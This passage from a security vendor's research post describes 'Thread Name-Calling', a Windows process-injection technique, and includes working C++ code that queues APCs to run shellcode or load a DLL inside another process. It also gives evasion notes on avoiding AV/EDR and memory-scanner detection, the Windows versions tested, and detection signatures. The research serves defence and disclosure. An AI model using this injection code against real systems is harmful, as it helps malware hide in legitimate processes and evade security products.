return isOk;

}

bool run\_injected\_v1(HANDLE hProcess, void\* remotePtr, size\_t payload\_len)
{
DWORD oldProtect = 0;
if (!VirtualProtectEx(hProcess, remotePtr, payload\_len, PAGE\_EXECUTE\_READWRITE, &oldProtect)) {
std::cout << "Failed to protect!" << std::hex << GetLastError() << "\\n";
return false;
}
HANDLE hThread = find\_thread(hProcess, THREAD\_SET\_CONTEXT);
if (!hThread \|\| hThread == INVALID\_HANDLE\_VALUE) {
std::cerr << "Invalid thread handle!\\n";
return false;
}
bool isOk = false;
auto \_RtlDispatchAPC = GetProcAddress(GetModuleHandle("ntdll.dll"), MAKEINTRESOURCE(8)); //RtlDispatchAPC;
if (\_RtlDispatchAPC) {
if (queue\_apc\_thread(hThread, \_RtlDispatchAPC, shellcodePtr, 0, (void\*)(-1))) {
isOk = true;
}
}
CloseHandle(hThread);
return isOk;
}

```
bool run_injected_v1(HANDLE hProcess, void* remotePtr, size_t payload_len)
{
    DWORD oldProtect = 0;
    if (!VirtualProtectEx(hProcess, remotePtr, payload_len, PAGE_EXECUTE_READWRITE, &oldProtect)) {
        std::cout << "Failed to protect!" << std::hex << GetLastError() << "\n";
        return false;
    }
    HANDLE hThread = find_thread(hProcess, THREAD_SET_CONTEXT);
    if (!hThread || hThread == INVALID_HANDLE_VALUE) {
        std::cerr << "Invalid thread handle!\n";
        return false;
    }
    bool isOk = false;
    auto _RtlDispatchAPC = GetProcAddress(GetModuleHandle("ntdll.dll"), MAKEINTRESOURCE(8)); //RtlDispatchAPC;
    if (_RtlDispatchAPC) {
        if (queue_apc_thread(hThread, _RtlDispatchAPC, shellcodePtr, 0, (void*)(-1))) {
            isOk = true;
        }
    }
    CloseHandle(hThread);
    return isOk;
}
```

Extended version, covering different possibilities:

Plain text

Copy to clipboard

Open code in new window

EnlighterJS 3 Syntax Highlighter

boolrun\_injected(HANDLE hProcess, void\\* remotePtr, size\_t payload\_len)

{

void\\* shellcodePtr = remotePtr;

#ifdef USE\_EXISTING\_THREAD

HANDLE hThread = find\_thread(hProcess, THREAD\_SET\_CONTEXT);

#else

HANDLE hThread = create\_alertable\_thread(hProcess);

#endif

if(!hThread \|\| hThread == INVALID\_HANDLE\_VALUE){

std::cerr <<"Invalid thread handle!\\n";

returnfalse;

}

#ifdef USE\_NEW\_BUFFER

shellcodePtr = VirtualAllocEx(hProcess, nullptr, payload\_len, MEM\_COMMIT \| MEM\_RESERVE, PAGE\_EXECUTE\_READWRITE);

if(!shellcodePtr){

std::cout <<"Failed to allocate!"<< std::hex <<GetLastError()<<"\\n";

returnfalse;

}

std::cout <<"Allocated: "<< std::hex << shellcodePtr <<"\\n";

void\\* \_RtlMoveMemoryPtr = GetProcAddress(GetModuleHandle("ntdll.dll"), "RtlMoveMemory");

if(!\_RtlMoveMemoryPtr){

std::cerr <<"Failed retrieving: \_RtlMoveMemoryPtr\\n";

returnfalse;

}

if(!queue\_apc\_thread(hThread, \_RtlMoveMemoryPtr, shellcodePtr, remotePtr, (void\*)payload\_len)){

returnfalse;

}

std::cout <<"Added RtlMoveMemory to the thread queue!\\n";

#else

DWORD oldProtect = 0;

if(!VirtualProtectEx(hProcess, shellcodePtr, payload\_len, PAGE\_EXECUTE\_READWRITE, &oldProtect)){

std::cout <<"Failed to protect!"<< std::hex <<GetLastError()<<"\\n";

returnfalse;

}

std::cout <<"Protection changed! Old: "<< std::hex << oldProtect <<"\\n";

#endif

bool isOk = false;

auto \_RtlDispatchAPC = GetProcAddress(GetModuleHandle("ntdll.dll"), MAKEINTRESOURCE(8)); //RtlDispatchAPC;

if(\_RtlDispatchAPC){

std::cout <<"Using RtlDispatchAPC\\n";

if(queue\_apc\_thread(hThread, \_RtlDispatchAPC, shellcodePtr, 0, (void\*)(-1))){

isOk = true;

}

}

else{

if(queue\_apc\_thread(hThread, shellcodePtr, 0, 0, 0)){

isOk = true;

}

}

if(isOk) std::cout <<"Added to the thread queue!\\n";

#ifndef USE\_EXISTING\_THREAD

ResumeThread(hThread);

#endif

CloseHandle(hThread);

return isOk;

}

bool run\_injected(HANDLE hProcess, void\* remotePtr, size\_t payload\_len)
{
void\* shellcodePtr = remotePtr;
#ifdef USE\_EXISTING\_THREAD
HANDLE hThread = find\_thread(hProcess, THREAD\_SET\_CONTEXT);
#else
HANDLE hThread = create\_alertable\_thread(hProcess);
#endif
if (!hThread \|\| hThread == INVALID\_HANDLE\_VALUE) {
std::cerr << "Invalid thread handle!\\n";
return false;
}
#ifdef USE\_NEW\_BUFFER
shellcodePtr = VirtualAllocEx(hProcess, nullptr, payload\_len, MEM\_COMMIT \| MEM\_RESERVE, PAGE\_EXECUTE\_READWRITE);
if (!shellcodePtr) {
std::cout << "Failed to allocate!" << std::hex << GetLastError() << "\\n";
return false;
}
std::cout << "Allocated: " << std::hex << shellcodePtr << "\\n";
void\* \_RtlMoveMemoryPtr = GetProcAddress(GetModuleHandle("ntdll.dll"), "RtlMoveMemory");
if (!\_RtlMoveMemoryPtr) {
std::cerr << "Failed retrieving: \_RtlMoveMemoryPtr\\n";
return false;
}
if (!queue\_apc\_thread(hThread, \_RtlMoveMemoryPtr, shellcodePtr, remotePtr, (void\*)payload\_len)) {
return false;
}
std::cout << "Added RtlMoveMemory to the thread queue!\\n";
#else
DWORD oldProtect = 0;
if (!VirtualProtectEx(hProcess, shellcodePtr, payload\_len, PAGE\_EXECUTE\_READWRITE, &oldProtect)) {
std::cout << "Failed to protect!" << std::hex << GetLastError() << "\\n";
return false;
}
std::cout << "Protection changed! Old: " << std::hex << oldProtect << "\\n";
#endif
bool isOk = false;
auto \_RtlDispatchAPC = GetProcAddress(GetModuleHandle("ntdll.dll"), MAKEINTRESOURCE(8)); //RtlDispatchAPC;
if (\_RtlDispatchAPC) {
std::cout << "Using RtlDispatchAPC\\n";
if (queue\_apc\_thread(hThread, \_RtlDispatchAPC, shellcodePtr, 0, (void\*)(-1))) {
isOk = true;
}
}
else {
if (queue\_apc\_thread(hThread, shellcodePtr, 0, 0, 0)) {
isOk = true;
}
}
if (isOk) std::cout << "Added to the thread queue!\\n";
#ifndef USE\_EXISTING\_THREAD
ResumeThread(hThread);
#endif
CloseHandle(hThread);
return isOk;
}

```
bool run_injected(HANDLE hProcess, void* remotePtr, size_t payload_len)
{
    void* shellcodePtr = remotePtr;
#ifdef USE_EXISTING_THREAD
    HANDLE hThread = find_thread(hProcess, THREAD_SET_CONTEXT);
#else
    HANDLE hThread = create_alertable_thread(hProcess);
#endif
    if (!hThread || hThread == INVALID_HANDLE_VALUE) {
        std::cerr << "Invalid thread handle!\n";
        return false;
    }
#ifdef USE_NEW_BUFFER
    shellcodePtr = VirtualAllocEx(hProcess, nullptr, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!shellcodePtr) {
        std::cout << "Failed to allocate!" << std::hex << GetLastError() << "\n";
        return false;
    }
    std::cout << "Allocated: " << std::hex << shellcodePtr << "\n";
    void* _RtlMoveMemoryPtr = GetProcAddress(GetModuleHandle("ntdll.dll"), "RtlMoveMemory");
    if (!_RtlMoveMemoryPtr) {
        std::cerr << "Failed retrieving: _RtlMoveMemoryPtr\n";
        return false;
    }
    if (!queue_apc_thread(hThread, _RtlMoveMemoryPtr, shellcodePtr, remotePtr, (void*)payload_len)) {
        return false;
    }
    std::cout << "Added RtlMoveMemory to the thread queue!\n";
#else
    DWORD oldProtect = 0;
    if (!VirtualProtectEx(hProcess, shellcodePtr, payload_len, PAGE_EXECUTE_READWRITE, &oldProtect)) {
        std::cout << "Failed to protect!" << std::hex << GetLastError() << "\n";
        return false;
    }
    std::cout << "Protection changed! Old: " << std::hex << oldProtect << "\n";
#endif
    bool isOk = false;
    auto _RtlDispatchAPC = GetProcAddress(GetModuleHandle("ntdll.dll"), MAKEINTRESOURCE(8)); //RtlDispatchAPC;
    if (_RtlDispatchAPC) {
        std::cout << "Using RtlDispatchAPC\n";
        if (queue_apc_thread(hThread, _RtlDispatchAPC, shellcodePtr, 0, (void*)(-1))) {
            isOk = true;
        }
    }
    else {
        if (queue_apc_thread(hThread, shellcodePtr, 0, 0, 0)) {
            isOk = true;
        }
    }
    if (isOk) std::cout << "Added to the thread queue!\n";
#ifndef USE_EXISTING_THREAD
    ResumeThread(hThread);
#endif
    CloseHandle(hThread);
    return isOk;
}
```

And it works!

> _**See in action**_
>
> Video demo: [https://youtu.be/1BJaxHh91p4](https://youtu.be/1BJaxHh91p4)

![Figure 3 - Demo of the Thread Name-Calling: the code injected into mspaint.exe executed a new process: calc.exe](https://research.checkpoint.com/wp-content/uploads/2024/07/TXYQKLGPF9-rId99.png)Figure 3 – Demo of the Thread Name-Calling: the code injected into mspaint.exe executed a new process: calc.exe

As we found during our tests, although we call the potentially suspicious API (`VirtualProtectEx` or `VirtualAllocEx` ), for most of the products this indicator alone was not enough to flag the payload: it is was not registered that we are using an injected buffer.

### Known limitations and field for improvements

During our research, we assessed several different methods of making the injected buffer executable. Unfortunately, each of those methods has its flaws. The most straight-forward way is by the API that operates on the process, such as `VirtualProtectEx` or `VirtualAllocEx` – but, using those functions may draw unwanted attention. The alternative is calling functions `VirtualProtect` or `VirtualAlloc` remotely, via ROP – however, this involves a set of APIs that are even more suspicious, so we decided to stick with the simpler alternative.

The presence of the page with RWX access rights is another indicator that will be quickly picked up by memory scanners. Using just a few more calls, we can easily implement a scenario where we allocate a new memory region with Read/Write access, copy there the injected buffer, and then change it to Read/eXecute. Also, once we have our code executed within the context of a remote process, nothing stops us from pivoting further, allocating additional memory within it (as long as the process does not use DCP policy), and moving the payload, changing the access rights back to the initial ones.

If needed, we can also further reduce access rights with which the process has to be opened, as described at the beginning of the chapter.

## Bonus: DLL injection using Thread Name

[DLL injection is one of the well-known techniques](https://attack.mitre.org/techniques/T1055/001/) of augmenting a running process with our code. It is not a particularly stealthy technique, because it calls `LoadLibrary` on the payload (DLL) which has to be first dropped on the disk. In addition, the sole fact of loading a PE via standard API generates a kernel callback which can be used for detection. Nevertheless, it is one of the simple techniques that can be useful in some cases, and it is worthwhile to have in our arsenal.

Typical implementation of DLL injection involves:

1. `VirtualAllocEx` – to allocate memory for a DLL path within the remote process
2. `WriteProcessMemory` – to write the path into the allocated memory
3. `CreateRemoteThread` (or equivalents) – to call `LoadLibrary` remotely (passing it the pointer to the written path). Some variants may involve running the `LoadLibrary` via APC instead of the new thread.

In this section we propose an alternative implementation, that does not require write access right to the target process, and involves non-standard APIs:

1. `SetThreadDescription` + `NtQueueApcThreadEx2` with `GetThreadDescription` – for remote memory allocation + writing the path to the remote process
2. `NtQueueApcThreadEx2` – to call `LoadLibrary` remotely (but of course we can also use a new thread, like in the classic implementation)

The first step can be implemented exactly as in the Thread Name-Calling implementation (described under: ”Remote write with the help of thread description”). Snippet:

Plain text

Copy to clipboard

Open code in new window

EnlighterJS 3 Syntax Highlighter

const wchar\_t\* buf = dllName.c\_str();

void\\* remotePtr = get\_peb\_unused(hProcess);

wchar\_t\* wPtr = pass\_via\_thread\_name(hProcess, buf, remotePtr);

const wchar\_t\* buf = dllName.c\_str();
void\* remotePtr = get\_peb\_unused(hProcess);
wchar\_t\* wPtr = pass\_via\_thread\_name(hProcess, buf, remotePtr);

```
    const wchar_t* buf = dllName.c_str();
    void* remotePtr = get_peb_unused(hProcess);
    wchar_t* wPtr = pass_via_thread_name(hProcess, buf, remotePtr);
```

In contrast to Thread Name-Calling, we don’t have to change the access rights to our injected buffer, so the second step is very simple.

Plain text

Copy to clipboard

Open code in new window

EnlighterJS 3 Syntax Highlighter

boolinject\_with\_loadlibrary(HANDLE hProcess, PVOID remote\_ptr)

{

HANDLE hThread = find\_thread(hProcess, THREAD\_SET\_CONTEXT);

bool isOk = queue\_apc\_thread(hThread, LoadLibraryW, remote\_ptr, 0, 0);

CloseHandle(hThread);

return isOk;

}

bool inject\_with\_loadlibrary(HANDLE hProcess, PVOID remote\_ptr)
{
HANDLE hThread = find\_thread(hProcess, THREAD\_SET\_CONTEXT);
bool isOk = queue\_apc\_thread(hThread, LoadLibraryW, remote\_ptr, 0, 0);
CloseHandle(hThread);
return isOk;
}

```
bool inject_with_loadlibrary(HANDLE hProcess, PVOID remote_ptr)
{
    HANDLE hThread = find_thread(hProcess, THREAD_SET_CONTEXT);
    bool isOk = queue_apc_thread(hThread, LoadLibraryW, remote_ptr, 0, 0);
    CloseHandle(hThread);
    return isOk;
}
```

> _**See in action**_
>
> Video demo: [https://youtu.be/8cSNgE3gZxY](https://youtu.be/8cSNgE3gZxY)

## The tested targets

The described techniques were tested on Windows 10, and Windows 11. List of the tested versions:

Plain text

Copy to clipboard

Open code in new window

EnlighterJS 3 Syntax Highlighter

Version 10.0.19045 Build 19045(Windows 10 Enterprise, 64 bit)

Version 10.0.22621 Build 22000(Windows 11 Pro, 64 bit)

Version 10.0.22621 Build 22621(Windows 11 Pro, 64 bit - Windows 11 v22H2)

Version 10.0.22631 Build 22631(Windows 11 Pro, 64 bit - Windows 11 v23H2)

Version 10.0.19045 Build 19045 (Windows 10 Enterprise, 64 bit)
Version 10.0.22621 Build 22000 (Windows 11 Pro, 64 bit)
Version 10.0.22621 Build 22621 (Windows 11 Pro, 64 bit - Windows 11 v22H2)
Version 10.0.22631 Build 22631 (Windows 11 Pro, 64 bit - Windows 11 v23H2)

```
Version 10.0.19045 Build 19045 (Windows 10 Enterprise, 64 bit)
Version 10.0.22621 Build 22000 (Windows 11 Pro, 64 bit)
Version 10.0.22621 Build 22621 (Windows 11 Pro, 64 bit - Windows 11 v22H2)
Version 10.0.22631 Build 22631 (Windows 11 Pro, 64 bit - Windows 11 v23H2)
```

The intended target is a 64-bit process. The following mitigation policies may be set:

Plain text

Copy to clipboard

Open code in new window

EnlighterJS 3 Syntax Highlighter

DWORD64 MitgFlags = PROCESS\_CREATION\_MITIGATION\_POLICY\_CONTROL\_FLOW\_GUARD\_ALWAYS\_ON

\| PROCESS\_CREATION\_MITIGATION\_POLICY\_PROHIBIT\_DYNAMIC\_CODE\_ALWAYS\_ON // won't work with the version calling VirtualProtect/VirtualAlloc via ROP

\| PROCESS\_CREATION\_MITIGATION\_POLICY\_HEAP\_TERMINATE\_ALWAYS\_ON

\| PROCESS\_CREATION\_MITIGATION\_POLICY\_BOTTOM\_UP\_ASLR\_ALWAYS\_ON

\| PROCESS\_CREATION\_MITIGATION\_POLICY\_HIGH\_ENTROPY\_ASLR\_ALWAYS\_ON

\| PROCESS\_CREATION\_MITIGATION\_POLICY\_STRICT\_HANDLE\_CHECKS\_ALWAYS\_ON

\| PROCESS\_CREATION\_MITIGATION\_POLICY\_EXTENSION\_POINT\_DISABLE\_ALWAYS\_ON

\| PROCESS\_CREATION\_MITIGATION\_POLICY\_IMAGE\_LOAD\_NO\_REMOTE\_ALWAYS\_ON

\| PROCESS\_CREATION\_MITIGATION\_POLICY2\_MODULE\_TAMPERING\_PROTECTION\_ALWAYS\_ON

;

DWORD64 MitgFlags = PROCESS\_CREATION\_MITIGATION\_POLICY\_CONTROL\_FLOW\_GUARD\_ALWAYS\_ON
\| PROCESS\_CREATION\_MITIGATION\_POLICY\_PROHIBIT\_DYNAMIC\_CODE\_ALWAYS\_ON // won't work with the version calling VirtualProtect/VirtualAlloc via ROP
\| PROCESS\_CREATION\_MITIGATION\_POLICY\_HEAP\_TERMINATE\_ALWAYS\_ON
\| PROCESS\_CREATION\_MITIGATION\_POLICY\_BOTTOM\_UP\_ASLR\_ALWAYS\_ON
\| PROCESS\_CREATION\_MITIGATION\_POLICY\_HIGH\_ENTROPY\_ASLR\_ALWAYS\_ON
\| PROCESS\_CREATION\_MITIGATION\_POLICY\_STRICT\_HANDLE\_CHECKS\_ALWAYS\_ON
\| PROCESS\_CREATION\_MITIGATION\_POLICY\_EXTENSION\_POINT\_DISABLE\_ALWAYS\_ON
\| PROCESS\_CREATION\_MITIGATION\_POLICY\_IMAGE\_LOAD\_NO\_REMOTE\_ALWAYS\_ON
\| PROCESS\_CREATION\_MITIGATION\_POLICY2\_MODULE\_TAMPERING\_PROTECTION\_ALWAYS\_ON
;

```
  DWORD64 MitgFlags = PROCESS_CREATION_MITIGATION_POLICY_CONTROL_FLOW_GUARD_ALWAYS_ON
        | PROCESS_CREATION_MITIGATION_POLICY_PROHIBIT_DYNAMIC_CODE_ALWAYS_ON // won't work with the version calling VirtualProtect/VirtualAlloc via ROP
        | PROCESS_CREATION_MITIGATION_POLICY_HEAP_TERMINATE_ALWAYS_ON
        | PROCESS_CREATION_MITIGATION_POLICY_BOTTOM_UP_ASLR_ALWAYS_ON
        | PROCESS_CREATION_MITIGATION_POLICY_HIGH_ENTROPY_ASLR_ALWAYS_ON
        | PROCESS_CREATION_MITIGATION_POLICY_STRICT_HANDLE_CHECKS_ALWAYS_ON
        | PROCESS_CREATION_MITIGATION_POLICY_EXTENSION_POINT_DISABLE_ALWAYS_ON
        | PROCESS_CREATION_MITIGATION_POLICY_IMAGE_LOAD_NO_REMOTE_ALWAYS_ON
        | PROCESS_CREATION_MITIGATION_POLICY2_MODULE_TAMPERING_PROTECTION_ALWAYS_ON
        ;
```

Thread Name-Calling won’t work on processes that have the following mitigation policy set:

Plain text

Copy to clipboard

Open code in new window

EnlighterJS 3 Syntax Highlighter

PROCESS\_CREATION\_MITIGATION\_POLICY\_WIN32K\_SYSTEM\_CALL\_DISABLE\_ALWAYS\_ON

PROCESS\_CREATION\_MITIGATION\_POLICY\_WIN32K\_SYSTEM\_CALL\_DISABLE\_ALWAYS\_ON

```
PROCESS_CREATION_MITIGATION_POLICY_WIN32K_SYSTEM_CALL_DISABLE_ALWAYS_ON
```

## Source code

The complete source code, containing the implementation of described techniques, can be found in the following repository:

[https://github.com/hasherezade/thread\_namecalling](https://github.com/hasherezade/thread_namecalling)

## Conclusions

As new APIs are added to Windows, new ideas for injection techniques are appearing. To implement effective detection we must always keep an eye on the changing landscape. Fortunately, Microsoft also works on implementing more visibility for anti-malware products, and currently most of the important APIs can be monitored with the help of [ETW events](https://learn.microsoft.com/en-us/windows-hardware/drivers/devtest/event-tracing-for-windows--etw-).

Thread Name-Calling uses some of the relatively new APIs. However, it cannot avoid incorporating older well-known components, such as APC injections – APIs which should always be taken into consideration as a potential threat. Similarly, the manipulation of access rights within a remote process is a suspicious activity. However, even those indicators, when used out of the typical sequence of calls, may be overlooked by some of the AV and EDR products.

_**Check Point customers remain protected from the threats described in this research.**_

_**Check Point’s [Threat Emulation](https://www.checkpoint.com/infinity/zero-day-protection/) provides comprehensive coverage of attack tactics, file types, and operating systems and has developed and deployed a signature to detect and protect customers against threats described in this research.**_

_**Check Point’s [Harmony Endpoint](https://www.checkpoint.com/harmony/advanced-endpoint-protection/) provides comprehensive endpoint protection at the highest security level, crucial to avoid security breaches and data compromise. Behavioral Guard protections were developed and deployed to protect customers against the threats described in this research.**_

**TE/Harmony Endpoint protections:**

_Behavioral.Win.ImageModification.C_

_Behavioral.Win.ImageModification.F_

## References

[https://attack.mitre.org/techniques/T1055](https://attack.mitre.org/techniques/T1055)

[https://i.blackhat.com/USA-19/Thursday/us-19-Kotler-Process-Injection-Techniques-Gotta-Catch-Them-All-wp.pdf](https://i.blackhat.com/USA-19/Thursday/us-19-Kotler-Process-Injection-Techniques-Gotta-Catch-Them-All-wp.pdf)

[https://twitter.com/Hexacorn/status/1317424213951733761](https://twitter.com/Hexacorn/status/1317424213951733761)

[https://twitter.com/\_Gal\_Yaniv/status/1353630677493837825](https://twitter.com/_Gal_Yaniv/status/1353630677493837825)

[https://blahcat.github.io/posts/2019/03/17/small-dumps-in-the-big-pool.html](https://blahcat.github.io/posts/2019/03/17/small-dumps-in-the-big-pool.html)

[https://www.unknowncheats.me/forum/general-programming-and-reversing/596888-communicating-thread-name.html](https://www.unknowncheats.me/forum/general-programming-and-reversing/596888-communicating-thread-name.html)

[https://gitlab.com/ORCA000/t.d.p](https://gitlab.com/ORCA000/t.d.p)

[https://www.lodsb.com/shellcode-injection-using-threadnameinformation](https://www.lodsb.com/shellcode-injection-using-threadnameinformation)

[https://modexp.wordpress.com/2019/08/27/process-injection-apc/](https://modexp.wordpress.com/2019/08/27/process-injection-apc/)

[https://repnz.github.io/posts/apc/user-apc/#ntqueueapcthreadex-meet-special-user-apc](https://repnz.github.io/posts/apc/user-apc/#ntqueueapcthreadex-meet-special-user-apc)

[https://www.deepinstinct.com/blog/inject-me-x64-injection-less-code-injection](https://www.deepinstinct.com/blog/inject-me-x64-injection-less-code-injection)

[![](https://research.checkpoint.com/wp-content/uploads/2022/10/back_arrow.svg)\\
\\
\\
GO UP](https://research.checkpoint.com/2024/thread-name-calling-using-thread-name-for-offense/#single-post)

[BACK TO ALL POSTS](https://research.checkpoint.com/latest-publications/)

## POPULAR POSTS

[![](https://research.checkpoint.com/wp-content/uploads/2023/01/AI-1059x529-copy.jpg)](https://research.checkpoint.com/2023/opwnai-cybercriminals-starting-to-use-chatgpt/)

- Artificial Intelligence
- ChatGPT
- Check Point Research Publications

[OPWNAI : Cybercriminals Starting to Use ChatGPT](https://research.checkpoint.com/2023/opwnai-cybercriminals-starting-to-use-chatgpt/)

[![](https://research.checkpoint.com/wp-content/uploads/2019/01/Fortnite_1021x580.jpg)](https://research.checkpoint.com/2019/hacking-fortnite/)

- Check Point Research Publications
- Threat Research

[Hacking Fortnite Accounts](https://research.checkpoint.com/2019/hacking-fortnite/)

[![](https://research.checkpoint.com/wp-content/uploads/2022/12/OpenAIchatGPT_header.jpg)](https://research.checkpoint.com/2022/opwnai-ai-that-can-save-the-day-or-hack-it-away/)

- Artificial Intelligence
- ChatGPT
- Check Point Research Publications

[OpwnAI: AI That Can Save the Day or HACK it Away](https://research.checkpoint.com/2022/opwnai-ai-that-can-save-the-day-or-hack-it-away/)

### BLOGS AND PUBLICATIONS

[![](https://research.checkpoint.com/wp-content/uploads/2017/08/WannaCry-Post-No-Image-1021x450.jpg)](https://research.checkpoint.com/2017/the-next-wannacry-vulnerability-is-here/)

- Check Point Research Publications

August 11, 2017

### “The Next WannaCry” Vulnerability is Here

[![](https://research.checkpoint.com/wp-content/uploads/2018/01/rubyminer.jpg)](https://research.checkpoint.com/2018/rubyminer-cryptominer-affects-30-ww-networks/)

- Check Point Research Publications

January 11, 2018

### ‘RubyMiner’ Cryptominer Affects 30% of WW Networks

[![](https://research.checkpoint.com/wp-content/uploads/2020/02/CheckPointResearchTurkishRat_blog_header.jpg)](https://research.checkpoint.com/2020/the-turkish-rat-distributes-evolved-adwind-in-a-massive-ongoing-phishing-campaign/)

- Check Point Research Publications
- Global Cyber Attack Reports
- Threat Research

February 17, 2020

### “The Turkish Rat” Evolved Adwind in a Massive Ongoing Phishing Campaign

[![](https://research.checkpoint.com/wp-content/uploads/2017/08/WannaCry-Post-No-Image-1021x450.jpg)](https://research.checkpoint.com/2017/the-next-wannacry-vulnerability-is-here/)

- Check Point Research Publications

August 11, 2017

### “The Next WannaCry” Vulnerability is Here

[![](https://research.checkpoint.com/wp-content/uploads/2018/01/rubyminer.jpg)](https://research.checkpoint.com/2018/rubyminer-cryptominer-affects-30-ww-networks/)

- Check Point Research Publications

January 11, 2018

### ‘RubyMiner’ Cryptominer Affects 30% of WW Networks

[![](https://research.checkpoint.com/wp-content/uploads/2020/02/CheckPointResearchTurkishRat_blog_header.jpg)](https://research.checkpoint.com/2020/the-turkish-rat-distributes-evolved-adwind-in-a-massive-ongoing-phishing-campaign/)

- Check Point Research Publications
- Global Cyber Attack Reports
- Threat Research

February 17, 2020

### “The Turkish Rat” Evolved Adwind in a Massive Ongoing Phishing Campaign

[![](https://research.checkpoint.com/wp-content/uploads/2017/08/WannaCry-Post-No-Image-1021x450.jpg)](https://research.checkpoint.com/2017/the-next-wannacry-vulnerability-is-here/)

- Check Point Research Publications

August 11, 2017

### “The Next WannaCry” Vulnerability is Here

- 1
- 2
- 3

## We value your privacy!

BFSI uses cookies on this site. We use cookies to enable faster and easier experience for you. By continuing to visit this website you agree to our use of cookies.

ACCEPT

REJECT